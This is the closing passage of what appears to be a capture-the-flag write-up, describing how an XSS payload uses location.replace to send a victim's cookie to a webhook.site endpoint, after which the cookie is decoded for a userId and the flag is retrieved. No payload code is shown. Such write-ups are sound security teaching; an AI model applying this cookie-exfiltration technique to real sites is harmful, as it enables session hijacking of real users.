> Note: Usually, I prefer using the `fetch` function for making requests. However, for some unknown reason, I couldn't get it to work on the remote instance. As an alternative method for making a GET request, I used `location.replace`. 

`location.replace` will navigate the browser to our endpoint at [webhook.site](https://webhook.site){:target="_blank"}, and pass the cookie through a query parameter.

So, one of the nonces has to work, right?

Right. Cookie. 🍪

![](/uploads/{{ page.permalink }}/ss26.png)

Decode it to get the userId.

![](/uploads/{{ page.permalink }}/ss27.png)

Get the flag. 🎉 

![](/uploads/{{ page.permalink }}/ss28.png)
